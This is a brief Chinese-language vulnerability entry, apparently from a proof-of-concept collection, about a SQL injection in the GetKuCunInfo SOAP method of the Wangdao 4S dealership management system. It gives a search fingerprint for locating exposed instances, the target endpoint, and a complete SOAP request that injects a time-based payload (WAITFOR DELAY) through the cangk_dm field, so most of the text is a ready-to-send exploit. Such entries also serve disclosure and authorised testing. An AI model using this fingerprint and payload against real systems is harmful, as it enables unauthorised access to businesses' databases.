# 王道4S管理系统GetKuCunInfo存在SQL注入漏洞

王道4S管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="PixelsPerInch"`
- **请求**：`POST /public/PeiJianFuncWebService.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetKuCunInfo xmlns="http://tempuri.org/">
<peij_no>string</peij_no>
<cangk_dm>string';WAITFOR DELAY '0:0:5'--</cangk_dm>
</GetKuCunInfo>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200